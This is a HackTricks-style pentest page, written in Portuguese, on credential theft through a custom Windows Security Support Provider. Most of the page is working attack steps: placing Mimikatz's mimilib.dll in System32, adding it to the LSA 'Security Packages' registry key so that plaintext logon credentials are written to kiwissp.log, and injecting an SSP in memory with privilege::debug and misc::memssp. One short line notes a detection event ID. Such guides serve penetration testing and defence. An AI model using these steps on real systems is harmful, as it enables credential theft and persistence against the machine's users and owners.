# SSP personalizado

{{#include ../../banners/hacktricks-training.md}}

### SSP personalizado

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto simples** as **credenciais** usadas para acessar a máquina.

#### Mimilib

Você pode usar o binário `mimilib.dll` fornecido pelo Mimikatz. **Isso registrará em um arquivo todas as credenciais em texto simples.**\
Coloque a DLL em `C:\Windows\System32\`\
Obtenha uma lista dos LSA Security Packages existentes:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Adicione `mimilib.dll` à lista de Security Support Providers (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
E, após uma reinicialização, todas as credenciais podem ser encontradas em texto claro em `C:\Windows\System32\kiwissp.log`

#### Na memória

Você também pode injetar isso diretamente na memória usando o Mimikatz (observe que isso pode ser um pouco instável/não funcionar):
```bash
privilege::debug
misc::memssp
```
Isso não sobreviverá a reinicializações.

#### Mitigação

ID de evento 4657 - Auditoria da criação/alteração de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
